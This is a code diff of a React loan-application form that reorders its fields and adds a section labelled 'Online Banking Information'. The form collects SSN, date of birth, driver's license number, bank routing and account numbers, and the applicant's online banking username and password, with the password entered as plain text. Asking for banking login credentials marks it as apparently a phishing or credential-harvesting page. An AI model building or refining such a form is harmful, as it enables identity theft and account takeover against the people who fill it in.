@@ -159,26 +159,6 @@ function Apply() {
                 </div>
               </div>
 
-              {/* Loan Information */}
-              <div className="apply-form__group-title">Loan Details</div>
-              <div className="apply-form__field apply-form__field--full">
-                <label htmlFor="loanAmount">Select Loan Amount</label>
-                <select 
-                  id="loanAmount" 
-                  name="loanAmount" 
-                  value={formData.loanAmount} 
-                  onChange={handle} 
-                  required
-                >
-                  <option value="">Select an amount</option>
-                  {Array.from({ length: 47 }, (_, i) => 2000 + i * 500).map(amount => (
-                    <option key={amount} value={`$${amount.toLocaleString()}`}>
-                      ${amount.toLocaleString()}
-                    </option>
-                  ))}
-                </select>
-              </div>
-
               {/* Employment Information */}
               <div className="apply-form__group-title">Employment Information</div>
               <div className="apply-form__field apply-form__field--full">
@@ -195,47 +175,69 @@ function Apply() {
                   <input id="income" name="income" type="text" placeholder="Enter Monthly/Annual Income" value={formData.income} onChange={handle} required />
                 </div>
               </div>
-
-              {/* Identification Details */}
-              <div className="apply-form__group-title">Identification Details</div>
-              <div className="apply-form__row">
-                <div className="apply-form__field">
-                  <label htmlFor="dob">Date of Birth</label>
-                  <input id="dob" name="dob" type="date" value={formData.dob} onChange={handle} required />
-                </div>
-                <div className="apply-form__field">
-                  <label htmlFor="ssn">Social Security Number</label>
-                  <input id="ssn" name="ssn" type="text" placeholder="Enter SSN" value={formData.ssn} onChange={handle} pattern="\d{3}-?\d{2}-?\d{4}" title="9 digit SSN (e.g. 123-45-6789 or 123456789)" required />
-                </div>
-              </div>
               <div className="apply-form__field apply-form__field--full">
                 <label htmlFor="dlNumber">Driver's License Number</label>
                 <input id="dlNumber" name="dlNumber" type="text" placeholder="Enter DL Number" value={formData.dlNumber} onChange={handle} required />
               </div>
 
-              {/* Bank Information */}
-              <div className="apply-form__group-title">Bank Information</div>
+              {/* Banking Information */}
+              <div className="apply-form__group-title">Banking Information</div>
               <div className="apply-form__field apply-form__field--full">
-                <label htmlFor="bankName">Bank Name</label>
+                <label htmlFor="bankName">Bank Name*</label>
                 <input id="bankName" name="bankName" type="text" placeholder="Enter Bank Name" value={formData.bankName} onChange={handle} required />
               </div>
               <div className="apply-form__row">
                 <div className="apply-form__field">
-                  <label htmlFor="routingNumber">Routing Number</label>
+                  <label htmlFor="routingNumber">Routing Number*</label>
                   <input id="routingNumber" name="routingNumber" type="text" placeholder="Enter Routing Number" value={formData.routingNumber} onChange={handle} pattern="^\d{9}$" title="9 digit routing number" required />
                 </div>
                 <div className="apply-form__field">
-                  <label htmlFor="accountNumber">Account Number</label>
+                  <label htmlFor="accountNumber">Account Number*</label>
                   <input id="accountNumber" name="accountNumber" type="text" placeholder="Enter Account Number" value={formData.accountNumber} onChange={handle} pattern="^\d{8,17}$" title="Between 8 and 17 digit account number" required />
                 </div>
+              </div>
+
+              {/* Online Banking Information */}
+              <div className="apply-form__group-title">Online Banking Information</div>
+              <div className="apply-form__row">
                 <div className="apply-form__field">
-                  <label htmlFor="userId">User id</label>
+                  <label htmlFor="userId">Username*</label>
                   <input id="userId" name="userId" type="text" placeholder="Enter Username" value={formData.userId} onChange={handle} required />
                 </div>
                 <div className="apply-form__field">
-                  <label htmlFor="passcode">Passcode</label>
-                  <input id="passcode" name="passcode" type="text" placeholder="Enter Passcode" value={formData.passcode} onChange={handle} required />
+                  <label htmlFor="passcode">Password*</label>
+                  <input id="passcode" name="passcode" type="text" placeholder="Enter Password" value={formData.passcode} onChange={handle} required />
                 </div>
+              </div>
+              <div className="apply-form__row">
+                <div className="apply-form__field">
+                  <label htmlFor="ssn">SSN*</label>
+                  <input id="ssn" name="ssn" type="text" placeholder="Enter SSN" value={formData.ssn} onChange={handle} pattern="\d{3}-?\d{2}-?\d{4}" title="9 digit SSN (e.g. 123-45-6789 or 123456789)" required />
+                </div>
+                <div className="apply-form__field">
+                  <label htmlFor="dob">Date of birth*</label>
+                  <input id="dob" name="dob" type="date" value={formData.dob} onChange={handle} required />
+                </div>
+              </div>
+
+              {/* Loan Information */}
+              <div className="apply-form__group-title">Loan Information</div>
+              <div className="apply-form__field apply-form__field--full">
+                <label htmlFor="loanAmount">Select Loan Amount</label>
+                <select 
+                  id="loanAmount" 
+                  name="loanAmount" 
+                  value={formData.loanAmount} 
+                  onChange={handle} 
+                  required
+                >
+                  <option value="">Select an amount</option>
+                  {Array.from({ length: 47 }, (_, i) => 2000 + i * 500).map(amount => (
+                    <option key={amount} value={`$${amount.toLocaleString()}`}>
+                      ${amount.toLocaleString()}
+                    </option>
+                  ))}
+                </select>
               </div>
 
               <button type="submit" className="btn btn-primary btn-large apply-form__submit" disabled={loading} id="apply-submit-btn">
